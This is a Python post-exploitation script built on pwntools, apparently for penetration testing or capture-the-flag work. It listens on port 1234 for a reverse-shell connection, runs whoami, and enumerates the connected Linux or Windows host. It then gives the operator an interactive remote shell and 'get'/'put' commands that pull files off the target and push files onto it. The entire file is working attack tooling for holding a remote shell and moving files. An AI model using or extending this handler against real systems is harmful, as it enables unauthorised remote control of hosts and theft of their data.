from pwn import *
import socket
from remote.linuxremote import LinuxRemote
from remote.windowsremote import WindowsRemote

# context.log_level = logging.DEBUG
context.log_level = logging.ERROR


def get_lhost(rhost, rport):
    # https://stackoverflow.com/questions/24196932/how-can-i-get-the-ip-address-from-a-nic-network-interface-controller-in-python
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((rhost, rport))
    return s.getsockname()[0]


def main(listener):
    RHOST = listener.rhost
    rusername = listener.sendlinethen(b'\n', b'whoami').decode()[:-1]
    rprompt = f"{rusername}@{RHOST} {pwnlib.term.text.bold_green('$')} "

    LHOST = get_lhost(RHOST, listener.rport)
    lusername = os.getlogin()
    lprompt = f"{lusername}@{LHOST} {pwnlib.term.text.bold_green('$')} "
    lprompt = f"{pwnlib.term.text.bold_green('Command Mode:')} "

    if "\\" in rusername:
        remote = WindowsRemote(listener)
        print(f"Connected to Windows Host")
    else:
        remote = LinuxRemote(listener)
        print(f"Connected to Linux Host")

    print("Press Ctrl-C to enter/exit Command Mode")

    remote.enum(rusername)

    while listener.connected(direction="recv"):
        listener.interactive(prompt=rprompt)
        try:
            while listener.connected(direction="recv"):
                print(lprompt, end='')
                command = input()
                match command.split():
                    case ["get", filename]:
                        remote.get(Path(filename))
                    case ["put", filename]:
                        remote.put(Path(filename))
                    case ["exit"]:
                        listener.close()
                    case _:
                        # print(f"Command '{command[:-1]}' not understood")
                        print(
                            f"{pwnlib.term.text.bold_red('Commands: get/put <filename> or exit')}")
        except KeyboardInterrupt as e:
            # ctrl-c allows to switch between local and remote
            pass


if __name__ == "__main__":
    listener = listen(1234, fam=socket.AF_INET)
    _ = listener.wait_for_connection()
    main(listener)
    listener.wait_for_close()
